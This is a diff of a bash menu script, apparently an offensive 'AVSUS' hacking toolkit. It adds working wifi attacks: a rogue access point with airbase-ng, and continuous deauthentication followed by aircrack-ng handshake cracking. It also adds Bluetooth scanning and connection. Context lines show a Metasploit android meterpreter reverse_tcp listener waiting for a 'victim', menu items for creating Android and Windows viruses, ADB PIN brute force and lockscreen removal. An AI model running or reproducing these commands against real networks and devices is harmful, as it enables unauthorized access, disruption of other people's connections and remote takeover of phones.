@@ -19,21 +19,24 @@ w="\e[1;37m"      # putih tebal     #thick white
 
 
 ###############################give Permissons,if not root user exit
-echo -e "${lb}
+
+    
+echo -e "\033[34m
                         _       ___     ______            
                        | |     / \ \   / / ___| _   _ ___ 
                       / __)   / _ \ \ / /\___ \| | | / __|
-                      \__ \  / ___ \ V /  ___) | |_| \__ /
+                      \__ \  / ___ \ V /  ___) | |_| \__BLUE
                       (   / /_/   \_\_/  |____/ \__,_|___/
                        |_|
-${n}" | lolcat
-echo -e "${lb}
-                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-++-+-
-                      |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|
-                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
+\033[0m"
 
-$version
-${n}" | lolcat
+echo -e "\033[31m
+
+                      +-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-
+                      |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|
+                      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+\033[0m"
 
 while :; do
   for (( i=0; i<${#chars}; i++ )); do
@@ -47,6 +50,7 @@ while :; do
     fi
   done
 done
+
 
 packages=("figlet" "wget" "adb" "nmap")
 
@@ -93,15 +97,16 @@ echo "<-------------------------------------------------------------------------
 
 echo -e "\n\n\n"
 echo "[+] COMMANDS:" | lolcat
+echo "[+] usr" | lolcat
 echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
 echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
 echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
-echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
+echo "[4] DOWNLOAD ADB, SNAP, NMAP, FIGLET, PYTHON3, PIP, LOLCAT" | lolcat
 echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
 echo "[6] IP DETAILS" | lolcat
 echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
 echo "[8] REMOVE LOCKSCREEN" | lolcat
-echo "[10] INSTALL BASIC SOFTWARES" | lolcat
+echo "[10] INSTALL VS CODE, BLENDER, GOOGLE CHROME, MICROSOFT EDGE" | lolcat
 echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
 echo "[12] INSTALL PACKAGES" | lolcat
 echo "[13] PHONEINFOS" | lolcat
@@ -112,6 +117,12 @@ echo "[17] CREATE A VIRUS FOR ANDROID" | lolcat
 echo "[18] CREATE A VIRUS FOR WINDOWS" | lolcat
 echo "[19] MAC OS FOR KALI LINUX" | lolcat
 echo "[20] SCAN ALL WIFI NEAR YOU AND CHECK ALL DEVICES CONNECTED WITH YOUR WIFI" | lolcat
+echo "[21] CREATE A FAKE WIFI POINT" | lolcat
+echo "[22] CRACK THE PASSWORD OF WIFI" | lolcat
+echo "[23] TEST THE WIFI INTERFACE FOR HACKING" | lolcat
+echo "[24] DOWNLOAD SPOTIFY MUSIC USING URL" | lolcat
+echo "[25] DOWNLOAD YOUTUBE VIDEO" | lolcat
+echo "[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT" | lolcat
 echo "[99] ADDITIONAL commands" | lolcat
 
 echo -e "\n\n\n"
@@ -134,7 +145,7 @@ process_input() {
             ;;
         "hello" | "hi")
             echo "Hello! How can I assist you today?"
-            ;;
+            ;; # more
         "what is your name" | "who are you")
             echo "I am your advanced virtual assistant. How can I help you?"
             ;;
@@ -189,6 +200,54 @@ process_input() {
                 fi
             done
             ;;
+        24)
+	read -p "Enter the Spotify music URL: " spotify_url
+
+	# Installing spotdl (if not already installed)
+	command -v spotdl >/dev/null 2>&1 || {
+	    echo "spotdl is not installed. Installing..."
+	    pip install spotdl
+	}
+
+	# Downloading the Spotify music
+	spotdl "$spotify_url"
+
+	echo "Download complete!"
+        ;;
+        25)
+	echo "Enter the URL of the YouTube video you want to download:"
+	read url
+	echo "Enter the resolution you want to download (480p, 720p, 1080p, 1440p, 2160p) or type 'audio' to download only the audio:"
+	read res
+
+	if [ "$res" == "audio" ]; then
+	    youtube-dl -f bestaudio $url
+	else
+	    youtube-dl -f 'bestvideo[height<=?'$res']+bestaudio/best[height<=?'$res']' $url
+	fi
+        ;;
+        26)
+	if ! command -v bluetoothctl &> /dev/null
+	then
+	    echo "[+] INSTALLING BLUETOOTH"
+	    sudo apt-get update
+	    sudo apt-get install -y bluetooth
+	fi
+
+	# Scan for nearby Bluetooth devices
+	echo "Scanning for nearby Bluetooth devices..."
+	bluetoothctl scan on
+	sleep 5
+	bluetoothctl scan off
+
+	# List available devices
+	echo "Available devices:"
+	bluetoothctl devices
+
+	# Prompt user to connect to a device
+	read -p "Enter the MAC address of the device you want to connect to: " mac_address
+	bluetoothctl connect $mac_address
+        ;;
         2)
             echo "[+] STARTING 6-PIN BRUTE FORCE ATTACK"
             connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
@@ -498,6 +557,10 @@ process_input() {
         msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $own_ip; set LPORT 6666; run"
         echo "[+] PAYLOAD IS STARTED WAITING FOR VICTEM TO CONNECT..." | lolcat
         ;;
+        "install tplink wifi adapter's Driver")
+        echo "[+] INSTALLING DRIVER..."
+        sudo apt install realtek-rtl88xxau-dkms
+        ;;
         18)
         echo "[+] CREATING PAYLOAD FOR WINDOWS..." | lolcat
         own_ip=$(hostname -I | awk '{ print $1 }')
@@ -601,6 +664,102 @@ process_input() {
 	echo "Scanning local network for connected devices..."
 	nmap -sn $ip_range
         ;;
+        21)
+	default_bssid="D0:31:45:F3:D5:8D"
+	default_name="WIFI POINT"
+	default_interface="wlan0"
+
+	read -p "Enter the name of the WiFi (default: $default_name): " name_of_wifi
+	name_of_wifi=${name_of_wifi:-$default_name}
+	echo "[+] WIFI NAME ==> $name_of_wifi" | lolcat
+
+	read -p "Enter the BSSID (default: $default_bssid): " bssid
+	bssid=${bssid:-$default_bssid}
+	echo "[+] WIFI BSSID ==> $bssid" | lolcat
+	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+	interface=${interface:-$default_interface}
+	echo "[+] INTERFACE ==> $interface" | lolcat
+	airbase-ng -a $bssid --essid "$name_of_wifi" -c 5 $interface
+
+	echo "[+] FAKE WIFI IS SUCCESSFULLY CREATED." | lolcat
+        ;;
+        "set monitor mode")
+        default_interface="wlan0"
+        interface=${interface:-$default_interface}
+        read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+        sudo iwconfig $interface mode monitor
+        ;;
+        22)
+	# Prompting for the Wi-Fi adapter to use
+	read -p "Enter the Wi-Fi adapter to use (wlan0 or wlan1). Press enter for default (wlan0): " wifi_adapter
+	wifi_adapter=${wifi_adapter:-wlan0}
+
+	# Checking if pass.cap file exists in the current working directory
+	if [ ! -f "pass.cap" ]; then
+	    touch "pass.cap"
+	fi
+
+	# Scanning available Wi-Fi networks
+	wifi_list=$(nmcli device wifi list)
+
+	echo "Available Wi-Fi networks:"
+	echo "$wifi_list"
+
+	# Displaying IP and BSSID of available Wi-Fi networks
+	while read -r line; do
+	    ssid=$(echo $line | awk '{print $1}')
+	    bssid=$(echo $line | awk '{print $2}')
+	    ip=$(echo $line | awk '{print $3}')
+	    echo "SSID: $ssid, BSSID: $bssid, IP: $ip"
+	done <<< "$(nmcli -f SSID,BSSID,IP4.ADDRESS device wifi list)"
+
+	# Prompting for the desired network to connect
+	read -p "Enter the BSSID of the Wi-Fi network you want to use for handshake: " selected_bssid
+
+	# Connecting to the selected network
+	nmcli device wifi connect "$selected_bssid"
+
+	# Scanning the selected network
+	sudo airodump-ng "$wifi_adapter" --bssid "$selected_bssid"
+
+	# Performing a handshake with the selected network
+	sudo aireplay-ng --deauth 0 -a "$selected_bssid" "$wifi_adapter"
+
+	# Prompting for the path to the wordlist file
+	read -p "Enter the path to the wordlist file (press enter to skip): " wordlist_path
+
+	# Cracking the handshake (with or without wordlist)
+	if [ -z "$wordlist_path" ]; then
+	    sudo aircrack-ng -b "$selected_bssid" "pass.cap"
+	else
+	    sudo aircrack-ng -b "$selected_bssid" -w "$wordlist_path" "pass.cap"
+	fi
+        ;;
+        23)
+	default_bssid="D0:31:45:F3:D5:8D"
+	default_name="WIFI POINT"
+	default_interface="wlan0"
+	interface=${interface:-$default_interface}
+	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+	echo "[+] TESTING PACKET INJECTION" | lolcat
+	sudo aireplay-ng --test $interface
+	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+	echo "[+] MONITORING 5Ghz NETWORK NEAR YOU"
+	sudo airodump-ng --band a $interface
+        ;;
+        "reboot")
+        reboot
+        ;;
+        "set managed mode")
+        sudo ifconfig wlan0 down
+        sudo ifconfig wlan0 up
+        sudo iwconfig
+        echo "[+] CHANGING THE MODE OF WLAN0 TO MANAGED"
+        sudo iwconfig wlan0 mode managed
+        echo "[+] CHANGING THE MODE OF WLAN1 TO MANAGED"
+        sudo iwconfig wlan1 mode managed
+        echo "[+] MODE CHANGED." | lolcat
+        ;;
         "install metasploit on termux")
 	pkg update && pkg upgrade
 	pkg install -U git python ruby wget
@@ -630,6 +789,12 @@ process_input() {
         cd scrcpy
         chmod +x *
 	./install_release.sh
+        ;;
+        "iwconfig")
+        iwconfig | lolcat
+        ;;
+        "ifconfig")
+        ifconfig | lolcat
         ;;
         "open "*)
             software=${user_input#* }
@@ -840,8 +1005,36 @@ process_input() {
         "What are genes")
             echo "Genes are segments of DNA that contain the instructions for making proteins. Proteins determine many traits in an organism such as eye color and blood type."
         ;;
+        "exit")
+	chars="/-\|"
+	timeout=3
+	start=$(date +%s)
+	
+	while :; do
+	  for (( i=0; i<${#chars}; i++ )); do
+	    sleep 0.1
+	    echo -en "\r [+] SHUTTING DOWN...${chars:$i:1}" | lolcat
+	    now=$(date +%s)
+	    elapsed=$((now-start))
+	    if [[ $elapsed -ge $timeout ]]; then
+	      echo ""
+	      break 2 # break out of both loops
+	    fi
+	  done
+	done
+	exit
+        ;;
+        "restart")
+        exit
+        ./X.sh
+        ;;
         "What are chromosomes")
             echo "Chromosomes are long, threadlike structures located inside the nucleus of animal and plant cells. Each chromosome contains many genes. In humans, there are 23 pairs of chromosomes for a total of 46 chromosomes."
+        ;;
+    "usr")
+        read -p "[+] ENTER THE NEW USERNAME: " username
+        # Export the new username as an environment variable
+        export username
         ;;
         "how you can help me")
            echo "I AM A BASIC SHELL BASED VIRTUAL ASSISTANT, I CAN BRUTE FORCE A CONNECTED DEVICE"
@@ -857,9 +1050,15 @@ process_input() {
 }
 
 # Main loop to process user input
+#while true; do
+#    echo -e "\n\n"
+#    echo "┌──($ AVSUS㉿X)-[v2.0]" | lolcat
+#    read -p "└──$" input 
+#    process_input "$input"
+#done
 while true; do
     echo -e "\n\n"
-    echo "┌──($ AVSUS㉿X)-[v2.0]" | lolcat
+    echo -e "\033[34m┌──($ AVSUS㉿$username)-[v2.0]\033[0m"
     read -p "└──$" input 
     process_input "$input"
 done
